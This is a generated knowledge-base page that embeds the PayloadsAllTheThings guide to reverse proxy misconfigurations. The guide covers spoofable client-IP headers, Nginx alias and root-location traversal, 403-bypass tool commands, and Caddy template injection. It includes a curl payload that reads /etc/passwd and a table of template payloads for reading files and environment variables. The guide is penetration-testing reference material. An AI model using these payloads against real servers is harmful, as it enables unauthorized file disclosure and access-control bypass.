---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Reverse Proxy Misconfigurations

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-reverse-proxy-misconfigurations-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Reverse Proxy Misconfigurations/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Reverse Proxy Misconfigurations](../../topics/reverse-proxy-misconfigurations/reverse-proxy-misconfigurations.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-reverse-proxy-misconfigurations-readme |
| name | Reverse Proxy Misconfigurations |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Reverse%20Proxy%20Misconfigurations/README.md |

## Preserved Source Material

````yaml
_body: "# Reverse Proxy Misconfigurations\n\n> A reverse proxy is a server that sits between clients and backend servers,\
  \ forwarding client requests to the appropriate server while hiding the backend infrastructure and often providing load\
  \ balancing or caching. Misconfigurations in a reverse proxy, such as improper access controls, lack of input sanitization\
  \ in proxy_pass directives, or trusting client-provided headers like X-Forwarded-For, can lead to vulnerabilities like unauthorized\
  \ access, directory traversal, or exposure of internal resources.\n\n## Summary\n\n* [Tools](#tools)\n* [Methodology](#methodology)\n\
  \    * [HTTP Headers](#http-headers)\n        * [X-Forwarded-For](#x-forwarded-for)\n        * [X-Real-IP](#x-real-ip)\n\
  \        * [True-Client-IP](#true-client-ip)\n    * [Nginx](#nginx)\n        * [Off By Slash](#off-by-slash)\n        *\
  \ [Missing Root Location](#missing-root-location)\n    * [Caddy](#caddy)\n        * [Template Injection](#template-injection)\n\
  * [Labs](#labs)\n* [References](#references)\n\n## Tools\n\n* [yandex/gixy](https://github.com/yandex/gixy) - Nginx configuration\
  \ static analyzer.\n* [MegaManSec/Gixy-Next](https://github.com/MegaManSec/Gixy-Next) - Actively maintained Python3 fork\
  \ of gixy.\n* [shiblisec/Kyubi](https://github.com/shiblisec/Kyubi) - A tool to discover Nginx alias traversal misconfiguration.\n\
  * [laluka/bypass-url-parser](https://github.com/laluka/bypass-url-parser) - Tool that tests MANY url bypasses to reach a\
  \ 40X protected page.\n\n    ```ps1\n    bypass-url-parser -u \"http://127.0.0.1/juicy_403_endpoint/\" -s 8.8.8.8 -d\n \
  \   bypass-url-parser -u /path/urls -t 30 -T 5 -H \"Cookie: me_iz=admin\" -H \"User-agent: test\"\n    bypass-url-parser\
  \ -R /path/request_file --request-tls -m \"mid_paths, end_paths\"\n    ```\n\n## Methodology\n\n### HTTP Headers\n\nSince\
  \ headers like `X-Forwarded-For`, `X-Real-IP`, and `True-Client-IP` are just regular HTTP headers, a client can set or override\
  \ them if it can control part of the traffic path—especially when directly connecting to the application server, or when\
  \ reverse proxies are not properly filtering or validating these headers.\n\n#### X-Forwarded-For\n\n`X-Forwarded-For` is\
  \ an HTTP header used to identify the originating IP address of a client connecting to a web server through an HTTP proxy\
  \ or a load balancer.\n\nWhen a client makes a request through a proxy or load balancer, that proxy adds an X-Forwarded-For\
  \ header containing the client’s real IP address.\n\nIf there are multiple proxies (a request passes through several), each\
  \ proxy adds the address from which it received the request to the header, comma-separated.\n\n```ps1\nX-Forwarded-For:\
  \ 2.21.213.225, 104.16.148.244, 184.25.37.3\n```\n\nNginx can override the header with the client's real IP address.\n\n\
  ```ps1\nproxy_set_header X-Forwarded-For $remote_addr;\n```\n\n#### X-Real-IP\n\n`X-Real-IP` is another custom HTTP header,\
  \ commonly used by Nginx and some other proxies, to forward the original client IP address. Rather than including a chain\
  \ of IP addresses like X-Forwarded-For, X-Real-IP contains only a single IP: the address of the client connecting to the\
  \ first proxy.\n\n#### True-Client-IP\n\n`True-Client-IP` is a header developed and standardized by some providers, particularly\
  \ by Akamai, to pass the original client’s IP address through their infrastructure.\n\n### Nginx\n\n#### Off By Slash\n\n\
  Nginx matches incoming request URIs against the location blocks defined in your configuration.\n\n* `location /app/` matches\
  \ requests to `/app/`, `/app/foo`, `/app/bar/123`, etc.\n* `location /app` (no trailing slash) matches `/app*` (i.e., `/application`,\
  \ `/appfile`, etc.),\n\nThis means in Nginx, the presence or absence of a slash in a location block changes the matching\
  \ logic.\n\n```ps1\nserver {\n  location /app/ {\n    # Handles /app/ and anything below, e.g., /app/foo\n  }\n  location\
  \ /app {\n    # Handles only /app with nothing after OR routes like /application, /appzzz\n  }\n}\n```\n\nExample of a vulnerable\
  \ configuration: An attacker requesting `/styles../secret.txt` resolves to `/path/styles/../secret.txt`\n\n```ps1\nlocation\
  \ /styles {\n  alias /path/css/;\n}\n```\n\n#### Missing Root Location\n\nThe `root /etc/nginx;` directive sets the server's\
  \ root directory for static files.\nThe configuration doesn't have a root location `/`, it will be set globally set.\nA\
  \ request to `/nginx.conf` would resolve to `/etc/nginx/nginx.conf`.\n\n```ps1\nserver {\n  root /etc/nginx;\n\n  location\
  \ /hello.txt {\n    try_files $uri $uri/ =404;\n    proxy_pass http://127.0.0.1:8080/;\n  }\n}\n```\n\n### Caddy\n\n####\
  \ Template Injection\n\nThe provided Caddy web server config uses the `templates` directive, which allows dynamic content\
  \ rendering with Go templates.\n\n```ps1\n:80 {\n    root * /\n    templates\n    respond \"You came from {http.request.header.Referer}\"\
  \n}\n```\n\nThis tells Caddy to process the response string as a template, and interpolate any variables (using Go template\
  \ syntax) present in the referenced request header.\n\nIn this curl request, the attacker supplied as `Referer` header a\
  \ Go template expression: `{{readFile \"etc/passwd\"}}`.\n\n```ps1\ncurl -H 'Referer: {{readFile \"etc/passwd\"}}' http://localhost/\n\
  ```\n\n```ps1\nHTTP/1.1 200 OK\nContent-Length: 716\nContent-Type: text/plain; charset=utf-8\nServer: Caddy\nDate: Thu,\
  \ 24 Jul 2025 08:00:50 GMT\n\nYou came from root:x:0:0:root:/root:/bin/sh\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\n\
  ```\n\nBecause Caddy is running the templates directive, it will evaluate anything in curly braces inside the context, including\
  \ things from untrusted input. The `readFile` function is available in Caddy templates, so the attacker's input causes Caddy\
  \ to actually read `/etc/passwd` and insert its content into the HTTP response.\n\n| Payload                       | Description\
  \ |\n| ----------------------------- | ----------- |\n| `{{env \"VAR_NAME\"}}`          | Get an environment variable  \
  \ |\n| `{{listFiles \"/\"}}`           | List all files in a directory |\n| `{{readFile \"path/to/file\"}}` | Read a file\
  \ |\n\n## Labs\n\n* [Root Me - Nginx - Alias Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Alias-Misconfiguration)\n\
  * [Root Me - Nginx - Root Location Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Root-Location-Misconfiguration)\n\
  * [Root Me - Nginx - SSRF Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-SSRF-Misconfiguration)\n\
  * [Detectify - Vulnerable Nginx](https://github.com/detectify/vulnerable-nginx)\n\n## References\n\n* [What is X-Forwarded-For\
  \ and when can you trust it? - Phil Sturgeonopens - January 31, 2024](https://web.archive.org/web/20260112224231/https://httptoolkit.com/blog/what-is-x-forwarded-for/)\n\
  * [Common Nginx misconfigurations that leave your web server open to attack - Detectify - November 10, 2020](https://web.archive.org/web/20260227155031/https://blog.detectify.com/industry-insights/common-nginx-misconfigurations-that-leave-your-web-server-ope-to-attack/)"
_relative_path: Reverse Proxy Misconfigurations/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Reverse Proxy Misconfigurations/README.md
````
